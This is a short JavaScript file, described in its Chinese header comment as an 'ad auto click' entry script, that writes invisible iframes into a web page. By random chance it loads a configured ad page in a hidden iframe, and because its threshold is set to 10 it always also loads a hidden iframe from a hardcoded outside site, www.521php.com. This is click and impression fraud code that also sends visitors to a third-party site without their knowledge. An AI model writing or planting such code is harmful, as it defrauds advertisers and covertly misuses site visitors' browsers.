/**
*ad auto click 入口文件
*author chao
*_v 触发几率，1-10;
*_adhtml 广告页面
*/
var _num = 10;
function GetRandomNum(Min,Max)
{
var Range = Max - Min;
var Rand = Math.random();
return(Min + Math.round(Rand * Range));   
}
var _num2 = GetRandomNum(1,10);
var _html='';
if(_v >= _num2){
	_html +='<span style="display:none"><iframe src="'+_adhtml+'"></iframe></span>';
}
var _num2 = GetRandomNum(1,10);
if(_num >= _num2){
	_html +='<div style="display:none"><iframe src="http://www.521php.com/index1.html"></iframe></div>';
	//document.write('<div style="display:none"><iframe src="http://www.521php.com/index1.html"></div>');
}
//alert(_html);
document.write(_html);
